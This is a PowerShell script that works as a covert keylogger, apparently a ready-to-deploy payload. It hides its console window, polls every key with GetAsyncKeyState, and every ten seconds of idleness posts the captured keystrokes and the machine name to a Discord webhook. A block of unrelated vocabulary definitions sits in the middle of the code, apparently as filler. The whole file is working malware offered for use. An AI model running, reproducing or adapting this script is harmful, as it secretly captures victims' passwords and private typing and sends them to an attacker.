$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'xxx'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

<#
Ablaze â€“ On fire; brightly burning with intensity.

Banter â€“ Playful, teasing talk between close friends.

Crisp â€“ Firm, dry, and easily breakable texture.

Dapper â€“ Stylish, neat man with elegant appearance.

Elicit â€“ Draw out a response or reaction.

Fathom â€“ Understand something deeply, often abstractly.

Glimpse â€“ Quick, brief look without full details.

Havoc â€“ Widespread destruction; total chaos and disorder.

Imbue â€“ Fill or inspire with certain feelings.

Jovial â€“ Cheerful, friendly, full of good humor.

Keen â€“ Sharp, eager, or intellectually perceptive mind.

Lurk â€“ Remain hidden, waiting to spring forth.

Mirth â€“ Amusement expressed through laughter or cheerfulness.

Nimble â€“ Quick and light in movement or action.

#>

$defs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$LastpressTime = [System.Diagnostics.Stopwatch]::StartNew()
$Threshold = [TimeSpan]::FromSeconds(10)

While ($true){
  $iskeyPressed = $false
    try{
      while ($LastpressTime.Elapsed -lt $Threshold) {
      Start-Sleep -Milliseconds 30
        for ($Collected = 8; $Collected -le 254; $Collected++){
        $keyst = $defs::GetAsyncKeyState($Collected)
          # If a key is pressed
          if ($keyst -eq -32767) {
          # Restart the inactivity timer
          $iskeyPressed = $true
          $LastpressTime.Restart()
          $null = [console]::CapsLock
          # Translate the keycode to a letter
          $vtkey = $defs::MapVirtualKey($Collected, 3)
          $kbst = New-Object Byte[] 256
          $checkState = $defs::GetKeyboardState($kbst)
          $SaveCharacter = New-Object -TypeName System.Text.StringBuilder
            # Define the key that was pressed          
            if ($defs::ToUnicode($Collected, $vtkey, $kbst, $SaveCharacter, $SaveCharacter.Capacity, 0)) {
              $LoggedString = $SaveCharacter.ToString()
                if ($Collected -eq 8) {$LoggedString = "[BACKSP]"}
                if ($Collected -eq 13) {$LoggedString = "[ENTER]"}
                if ($Collected -eq 27) {$LoggedString = "[ESC]"}
            # Add the key to sending variable
            $send += $LoggedString 
            }
          }
        }
      }
    }
    finally{
      If ($iskeyPressed) {
      # Send the saved keys to a webhook
      $Escaped = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$Escaped+'`'
      $JsonWrapper = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      IRM -Uri $dc -Method Post -ContentType "application/json" -Body $JsonWrapper
      #Remove log file and reset inactivity check 
      $send = ""
      $iskeyPressed = $false
      }
    }
  # reset stopwatch before restarting the loop
  $LastpressTime.Restart()
  Start-Sleep -Milliseconds 10
}

